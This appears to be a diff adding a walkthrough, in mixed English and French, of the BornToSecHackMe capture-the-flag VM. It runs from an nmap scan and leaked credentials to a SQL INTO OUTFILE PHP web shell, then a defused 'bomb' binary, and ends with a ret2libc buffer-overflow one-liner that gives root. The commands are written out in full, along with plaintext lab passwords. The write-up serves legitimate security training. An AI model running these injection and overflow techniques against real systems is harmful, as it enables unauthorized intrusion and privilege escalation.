@@ -1,0 +1,191 @@
+step 0 : getting target ip and running services
+	- use nmap on target ip to get running servers (scanning all LAN addresses similar to mines with nmap 192.168.2.1-254)
+
+	Nmap scan report for BornToSecHackMe (192.168.2.101)
+	Host is up (0.00060s latency).
+	Not shown: 994 closed ports
+	PORT    STATE SERVICE
+	21/tcp  open  ftp
+	22/tcp  open  ssh
+	80/tcp  open  http
+	143/tcp open  imap
+	443/tcp open  https
+	993/tcp open  imaps
+	MAC Address: 08:00:27:35:22:74 (Oracle VirtualBox virtual NIC)
+
+	- the host name leaves no doubpt: this is the target
+
+
+step 1 : the web server
+	- use dirb to scan more commons urls behind a server, we target the https
+	- we found that there is a forum at https://192.168.2.101/forum/index.php then by looking in the
+	topics, there is a "probleme login ?" topic with some system logs
+	- reading the logs leads us to a failed login attemp with login
+	"!q\]Ej?*5K5cy*AJ", from 161.202.39.39 i assume this is a password,
+	then i try to login as "lmezard" with this password to the forum -> succeed
+	- we are in the account page of lmezard, we got her mail: laurie@borntosec.net
+
+step 2 : the webmail service
+	- trying to use laurie@borntosec.net as login and the same password -> succeed
+	- there is a "DB access", with root database access root/Fg-'kKXBj87E:aJ$
+
+step 3 : the database
+	- we go to https://192.168.2.101/phpmyadmin and login as root with Fg-'kKXBj87E:aJ$ as password
+	- access granted to phpmyadmim, let's take a look if it's possible to use some sql injections and other nasty stuffs...
+	- lecture of this article http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2 seems
+	to prove that it's possible to write a custom file on the server disk, let's give it a try...
+	- using the following sql injection
+	  select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/credentials.php"
+	- then visiting the page https://192.168.2.101/forum/templates_c/credentials.php show
+	us lmezard:G!@M6f4Eatau{sF" 
+
+step 4 : the ftp server
+	- i choose to use "ftp" command
+
+ 	Connected to 192.168.2.101.
+	220 Welcome on this server
+	Name (192.168.2.101:adamaru): lmezard
+	331 Please specify the password.
+	Password: 
+	230 Login successful.
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp> ls
+	200 PORT command successful. Consider using PASV.
+	150 Here comes the directory listing.
+	-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+	-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+	226 Directory send OK.
+	ftp> get README
+	200 PORT command successful. Consider using PASV.
+	150 Opening BINARY mode data connection for README (96 bytes).
+	226 Transfer complete.
+	96 bytes received in 0.000177 seconds (530 kbytes/s)
+	ftp> get fun
+	200 PORT command successful. Consider using PASV.
+	150 Opening BINARY mode data connection for fun (808960 bytes).
+	226 Transfer complete.
+	808960 bytes received in 0.00517 seconds (149 Mbytes/s)
+	ftp> 221 Goodbye.
+
+	- i've seen 2 files on the server, i get them both
+	- cat README tells us that the next identifiers will be ssh connections informations, good to know.
+	- to find what kind of file is "fun" i use "file fun", it's a tar file, so let tar -xf fun
+	- now i got a directory named "ft_fun" full of .pcap files, they seems to be parts of .c files
+	- using clang *.cap is not successful, okay let's rebuild the
+	cfile with a custom script in python3, run ./rebuild.py /dev/shm/ft_fun/
+	- now i got a main.c , running clang main.c succeed, let's run the a.outfile
+	- the output is:
+	MY PASSWORD IS: Iheartpwnage
+	Now SHA-256 it and submit
+	- m'okay, let's do what it says: echo -n "Iheartpwnage" | sha256sum
+	- try to connect with ssh with: ssh laurie@192.168.2.101 with password
+	  330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+	- success !!
+
+step 5 : the bomb
+	- now we are in /home/laurie, there is 2 files a peacefull README and... bomb ? m'okay
+	- the README is prety useless but it tells us that if we got the pass then we will have to login as thor
+	- now it's time to get some some infomations about that bomb
+	- first : nm bomb to have an overview, i can see there is revelant functions:
+		08048b20 T phase_1
+		08048b48 T phase_2
+		08048b98 T phase_3
+		08048ce0 T phase_4
+		08048d2c T phase_5
+		08048d98 T phase_6
+	let's take a look of them in gdb (let's dissasemble the binary)
+	- gdb bomb
+	the phase 1:
+		- dissasemble phase_1 shows us that there is a string comparaisons, probably the password,
+		let's take a look with "x/s 0x80497c0" (0x80497c0 is the source address)
+		- bingo
+		(gdb) x/s 0x80497c0
+		0x80497c0:	 "Public speaking is very easy."
+
+	the phase 2:
+		- we can see in gdb there is an read_six_numbers function,
+		  inside it we see a call to sscanf and a format: "%d %d %d %d %d %d"
+		  at this point it's obvious that this function... read six numbers...
+		  if the read of numbers fail the bomb explode imediatly.
+		- an important thing is:    0x08048b60 <+24>:	add    $0x10,%esp
+		  it just read tab[0] (see bomb.c) and compare it to 1 latter
+		- the first digit MUST be 1
+		- after a long time we've understood that each digit is calculated
+		  with : (index + 1) * numbers[index]
+		  index is the position in the list of digits.
+		- so:
+		  1
+		  2 * 1 = 2
+		  2 * 3 = 6
+		  6 * 4 = 24
+		  24 * 5 = 120
+		  120 * 6 = 720
+		- the final solution is: 1 2 6 24 120 720
+
+	the phase 3:
+		- after dissasembling phase_3 we can see a call to sscanf,
+		  it's format is "%d %c %d".
+		- at this point we understand a certain logic in the README.me:
+		  " b " probably means that the char must be 'b'
+		- after some reverse we found that the correct param is:
+		  7 b 524 -> il est possible de trouver plusieurs solutions mais nous noterons: 1 b 214
+
+	the phase 4:
+		- after reading the func4 in gdb we understood that rax
+		  must be 0x35 (55) , rax is set by func4
+		- we can see that a call to sscanf is done with "%d" in format, so we
+		  need a number
+		- then func4 does it's crapy with it, and after some tests, found
+		  that the correct value is '9'
+
+	the phase 5:
+		Pour cette phase nous allons étudier plusieurs chaines de caractères.
+		- isrveawhobpnutfg
+		- giants -> la string qui va nous servir pour la comparaison
+		On se rends compte que la chaine que l'on met en entrée subit un & binaire, char par char.
+		Le résultat de cette opération sera un int qui sera utilisé pour localiser le caractère recherché dans la chaine "isrveawhobpnutfg" qui comporte les lettres de "giants".
+		Nous pouvons remarquer que:
+			- Le 'a' peut être soit 'e' soit 'u'
+			- le 's' peut être soit 'a' soit 'q'
+		Nous noterons: opekmq
+
+	the phase 6:
+		A force de mettre des breakpoints sur les <explode> on reverse engeneer en sachant que nous avons 6 nombres en entrée.
+		On sait que le 4 est forcément au début grâce au README.
+		On constate que si on met 2 nombres identiques on ne passe pas le 1er <explode>.
+		On constate aussi que si on met un chiffre supérieur à 6 on ne passe pas le 2nd <explode>.
+		Bon bah on va bruteforce en sachant tout ça -> go utiliser le fichier avec toutes les possibilitées ^^
+		On obtient comme résultat: 4 2 6 3 1 5
+
+	On obtient: Publicspeakingisveryeasy.126241207201b2149opekmq426315
+	Il y a cependant un bug sur l'iso sur les 2 avant derniers chiffres, comme cité sur le forum.
+	Le mot de passe pour thor est donc: Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+	en bref:
+		echo "Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9 austinpowers\nopekmq\n4 2 6 3 1 5\n1001\n" | ./bomb
+
+thor:
+	Bon on a un fichier qui décrit un tracé, après l'avoir terminé on trouve le mot: SLASH
+	Après quelques tests on trouve finalement le mot de passe en hashant SLASH en MD5.
+
+zaz:
+	Ahh, on a un fichier executable root ! Go voir si on peut faire un buffer overflow -> https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+	On l'obtient à 140 d'offset a l'EIP
+	Okay on a test avec le shellcode mais pas possible d'en trouver un qui marche avec cette iso ... bon bah Ret2LibC !
+
+
+	p system
+	$1 = {<text variable, no debug info>} 0xb7e6b060 <system>. -> on a l'adresse de system()
+
+	find __libc_start_main,+99999999,"/bin/sh"
+	0xb7f8cc58.                                                -> on a l'adresse d'un "/bin/sh"
+
+	Et go lancer le shell ! s^^ 
+	./exploit_me `python -c "print 'A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1] " `
+
+	whoami
+	root
+
+
+je sapelle root !!!
